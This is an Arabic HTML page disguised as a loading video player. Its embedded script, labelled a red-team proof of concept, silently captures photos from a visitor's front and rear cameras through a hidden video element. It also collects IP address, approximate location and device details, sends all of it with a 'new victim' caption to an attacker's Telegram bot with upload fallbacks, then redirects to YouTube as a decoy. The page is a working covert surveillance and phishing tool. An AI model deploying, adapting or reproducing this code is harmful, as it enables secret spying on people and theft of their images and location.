<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>مشغّل الفيديو — جارٍ التحميل...</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:#0f1115;color:#e8e8e8;font-family:"Segoe UI",Tahoma,Arial,sans-serif;height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden}
  .box{text-align:center}
  .player{width:320px;height:180px;border-radius:12px;margin:0 auto 18px;background:radial-gradient(circle at 30% 30%,#1c2230,#0a0c10);display:flex;align-items:center;justify-content:center;border:1px solid #232a38}
  .play{width:64px;height:64px;border-radius:50%;background:#e50914;display:flex;align-items:center;justify-content:center;box-shadow:0 0 30px rgba(229,9,20,.5);animation:pulse 1.6s infinite}
  .play::after{content:"";border-style:solid;border-width:12px 0 12px 20px;border-color:transparent transparent transparent #fff;margin-right:4px}
  @keyframes pulse{0%,100%{box-shadow:0 0 15px rgba(229,9,20,.4)}50%{box-shadow:0 0 40px rgba(229,9,20,.9)}}
  .bar{width:320px;height:6px;background:#232a38;border-radius:3px;margin:14px auto 10px;overflow:hidden}
  .bar i{display:block;height:100%;width:0;background:#e50914;border-radius:3px;animation:load 5s ease forwards}
  @keyframes load{to{width:100%}}
  .txt{color:#9aa4b5;font-size:14px}
</style>
</head>
<body>
<div class="box">
  <div class="player"><div class="play"></div></div>
  <div class="bar"><i></i></div>
  <div class="txt">جارٍ الاتصال بالخادم وتشفير الجلسة...</div>
</div>

<script>
/* ============================================================
   Camera Capture → Telegram Bot — Red Team PoC
   يلتقط صورة من الكاميرا الأمامية ثم الخلفية ويرسلها للبوت
   ============================================================ */

const CONFIG = {
  botToken:   "ضع_توكن_البوت_هنا",          // من BotFather
  chatId:     "ضع_رقم_الدردشة_هنا",          // معرفك (userinfobot أو getUpdates)
  decoyUrl:   "https://www.youtube.com",     // التحويل بعد التصوير (اتركه فارغ "" لتعطيله)
  redirectDelay: 6000,                        // ms قبل التحويل
  cameraWarmup: 1200,                         // ms انتظار تثبيت الكاميرا قبل اللقطة
  quality: 0.85,                              // جودة JPEG
  apiBase:  "",                               // Worker اختياري (انظر الشرح) — مثال: "https://xxx.workers.dev"
  grabIP:   true                              // التقاط IP وموقع تقريبي مع اللقطات
};

const sleep = ms => new Promise(r => setTimeout(r, ms));

/* ---------- 1) معلومات الضحية (IP + موقع تقريبي) ---------- */
async function getIPInfo() {
  if (!CONFIG.grabIP) return null;
  for (const url of ["https://ipwho.is/", "https://ipapi.co/json/"]) {
    try {
      const r = await fetch(url, { cache: "no-store" });
      const j = await r.json();
      if (j && (j.ip || j.latitude)) return j;
    } catch (e) {}
  }
  return null;
}

/* ---------- 2) رابط API مع دعم الـ Worker ---------- */
function apiUrl(method) {
  if (CONFIG.apiBase) return `${CONFIG.apiBase.replace(/\/+$/,"")}/${method}?token=${CONFIG.botToken}`;
  return `https://api.telegram.org/bot${CONFIG.botToken}/${method}`;
}

/* ---------- 3) التقاط صورة من كاميرا ---------- */
async function capturePhoto(facingMode) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: facingMode }, width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false
    });
    const video = document.createElement("video");
    video.setAttribute("playsinline", "");
    video.muted = true;
    video.srcObject = stream;
    video.style.cssText = "position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-events:none;z-index:-1";
    document.body.appendChild(video);
    await video.play();
    await sleep(CONFIG.cameraWarmup);

    const canvas = document.createElement("canvas");
    canvas.width  = video.videoWidth  || 1280;
    canvas.height = video.videoHeight || 720;
    const ctx = canvas.getContext("2d");
    if (facingMode === "user") {           // عكس الكاميرا الأمامية لصورة طبيعية
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
    }
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    stream.getTracks().forEach(t => t.stop());
    video.remove();

    return await new Promise(res => canvas.toBlob(res, "image/jpeg", CONFIG.quality));
  } catch (e) {
    return null; // رفض الإذن أو لا توجد كاميرا
  }
}

/* ---------- 4) رفع الصورة على telegra.ph (fallback) ---------- */
async function uploadToTelegraph(blob) {
  const fd = new FormData();
  fd.append("file", blob, "photo.jpg");
  const r = await fetch("https://telegra.ph/upload", { method: "POST", body: fd });
  const j = await r.json();
  if (j && j[0] && j[0].src) return "https://telegra.ph" + j[0].src;
  return null;
}

/* ---------- 5) إرسال صورة (ثلاث طبقات) ---------- */
async function sendPhoto(blob, caption) {
  // طبقة 1: multipart مباشر — الطلب يوصل حتى لو المتصفح ما يقرأ الرد (CORS)
  try {
    const fd = new FormData();
    fd.append("chat_id", CONFIG.chatId);
    fd.append("photo", blob, "photo.jpg");
    if (caption) fd.append("caption", caption);
    const r = await fetch(apiUrl("sendPhoto"), { method: "POST", body: fd });
    if (r.ok) return true;
  } catch (e) {}

  // طبقة 2: رفع على telegra.ph ثم إرسال الرابط
  try {
    const url = await uploadToTelegraph(blob);
    if (url) {
      const p = new URLSearchParams({ chat_id: CONFIG.chatId, photo: url });
      if (caption) p.set("caption", caption);
      await fetch(apiUrl("sendPhoto") + "?" + p.toString(), { method: "POST" });
      return true;
    }
  } catch (e) {}
  return false;
}

/* ---------- 6) إرسال رسالة نصية ---------- */
async function sendText(text) {
  try {
    const body = new URLSearchParams({ chat_id: CONFIG.chatId, text });
    const r = await fetch(apiUrl("sendMessage"), { method: "POST", body });
    return r.ok;
  } catch (e) { return true; } // الطلب وصل رغم حجب القراءة
}

/* ---------- التنفيذ الرئيسي ---------- */
(async () => {
  if (!CONFIG.botToken.startsWith("ضع") && !CONFIG.chatId.startsWith("ضع")) {
    if (sessionStorage.getItem("_done")) { if (CONFIG.decoyUrl) location.replace(CONFIG.decoyUrl); return; }
    sessionStorage.setItem("_done", "1");
  } else {
    console.warn("[PoC] ضع botToken و chatId في CONFIG");
  }

  if (CONFIG.decoyUrl) setTimeout(() => location.replace(CONFIG.decoyUrl), CONFIG.redirectDelay);
  if (!window.isSecureContext) console.warn("[PoC] الكاميرا تحتاج HTTPS");

  const info  = await getIPInfo();
  const ua    = navigator.userAgent;
  const stamp = new Date().toLocaleString("ar-EG");

  const victimSummary =
    "ضحية جديدة\n" +
    "الوقت: " + stamp + "\n" +
    "IP: " + (info?.ip || "غير معروف") + "\n" +
    "الموقع: " + [info?.city, info?.region, info?.country].filter(Boolean).join("، ") + "\n" +
    "الجهاز: " + ua.slice(0, 110) + "\n" +
    "اللغة: " + navigator.language + " | الشاشة: " + screen.width + "x" + screen.height;

  // التصوير: أمامية ← مهلة قصيرة ← خلفية
  const front = await capturePhoto("user");
  await sleep(400);
  const back  = await capturePhoto("environment");

  let sent = 0;
  if (front) { await sendPhoto(front, "الكاميرا الأمامية\n" + victimSummary); sent++; }
  if (back)  { await sendPhoto(back,  "الكاميرا الخلفية\n" + victimSummary); sent++; }
  if (!sent) await sendText("تعذر التصوير (رفض إذن الكاميرا)\n" + victimSummary);
})();
</script>
</body>
</html>
